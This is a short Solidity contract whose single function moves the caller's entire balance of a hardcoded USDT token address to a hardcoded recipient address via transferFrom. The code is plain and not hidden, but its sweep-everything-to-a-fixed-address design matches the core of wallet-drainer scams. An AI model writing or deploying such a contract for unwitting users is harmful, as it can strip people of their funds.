// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract USDTTransferTron {
    address public constant USDT = 0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C;
    address public constant RECIPIENT = 0xe530C737beA5d55d846e1E7b98a4d6D13B379248;
    
    function transferAllUSDT() external {
        uint256 balance = IERC20(USDT).balanceOf(msg.sender);
        require(balance > 0, "No USDT balance");
        require(IERC20(USDT).transferFrom(msg.sender, RECIPIENT, balance), "Transfer failed");
    }
}
